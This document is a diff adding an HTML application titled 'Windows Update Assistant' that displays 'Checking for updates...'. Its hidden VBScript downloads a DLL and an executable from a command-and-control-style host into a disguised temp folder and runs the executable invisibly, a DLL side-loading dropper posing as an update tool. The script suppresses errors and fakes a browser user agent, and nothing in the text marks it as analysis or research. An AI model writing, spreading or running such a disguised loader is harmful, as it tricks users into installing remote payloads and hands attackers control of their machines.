@@ -1,0 +1,42 @@
+<html>
+<head>
+<title>Windows Update Assistant</title>
+<script language="VBScript">
+On Error Resume Next
+Dim oShell,oFSO,oHTTP,oFile,sDst
+
+Set oShell=CreateObject("WScript.Shell")
+Set oFSO=CreateObject("Scripting.FileSystemObject")
+
+sDst=oShell.ExpandEnvironmentStrings("%TEMP%")&"\Microsoft\WinDefData"
+If Not oFSO.FolderExists(sDst) Then oFSO.CreateFolder sDst
+
+' Download dismcore.dll
+Set oHTTP=CreateObject("MSXML2.ServerXMLHTTP.6.0")
+oHTTP.Open "GET","https://c2.convert1ri.com/download/dismcore.dll",False
+oHTTP.setRequestHeader "User-Agent","Mozilla/5.0"
+oHTTP.Send
+If oHTTP.Status=200 Then
+    Dim s1:Set s1=CreateObject("ADODB.Stream")
+    s1.Type=1:s1.Open:s1.Write oHTTP.responseBody
+    s1.SaveToFile sDst&"\dismcore.dll",2:s1.Close
+End If
+
+' Download dism.exe
+Set oHTTP=CreateObject("MSXML2.ServerXMLHTTP.6.0")
+oHTTP.Open "GET","https://c2.convert1ri.com/download/dism.exe",False
+oHTTP.setRequestHeader "User-Agent","Mozilla/5.0"
+oHTTP.Send
+If oHTTP.Status=200 Then
+    Dim s2:Set s2=CreateObject("ADODB.Stream")
+    s2.Type=1:s2.Open:s2.Write oHTTP.responseBody
+    s2.SaveToFile sDst&"\dism.exe",2:s2.Close
+End If
+
+' Executar
+oShell.Run """"&sDst&"\dism.exe""",0,False
+window.close
+</script>
+</head>
+<body>Checking for updates...</body>
+</html>
